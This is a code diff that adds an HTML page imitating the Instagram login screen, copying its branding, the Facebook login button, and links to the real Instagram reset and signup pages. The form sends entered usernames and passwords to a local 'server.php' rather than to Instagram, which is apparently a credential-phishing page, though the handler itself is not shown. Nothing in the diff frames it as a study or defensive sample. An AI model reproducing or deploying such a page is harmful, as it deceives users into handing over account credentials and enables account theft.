@@ -1,0 +1,52 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    
+    <title>Instagram</title>
+    <link rel="stylesheet" href="css/style.css"/>
+    <meta name="viewport" content="width=device-width,initial scale=1.0">
+    
+    <script src="https://kit.fontawesome.com/27416b154a.js" crossorigin="anonymous"></script>
+    
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet"> 
+    
+</head>
+
+<body>
+    <div class="container">
+        <div id="effect">
+             <span>
+                 Instagram 
+                 <p>Find it for free on Google Play.</p> 
+             </span>
+             <input type="button" value="GET" id="get">
+        </div>
+       
+        <div class="header">
+            <div id="lang">English <i class="fas fa-angle-down"></i> </div>
+            Instagram
+        </div>
+        
+        <div class="facebook"> <i class="fa fa-facebook"></i> Continue with Facebook</div>
+        
+        
+        <div id="or">OR</div>
+        <form method="POST" action="server.php">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+
+            <button name="ins_submit" type="submit">Log In</button>
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+        </form>
+        
+        <div class="footer">
+            from<br><p>FACEBOOK</p>
+        </div>
+    
+
+    </div>
+</body>
+
+</html>
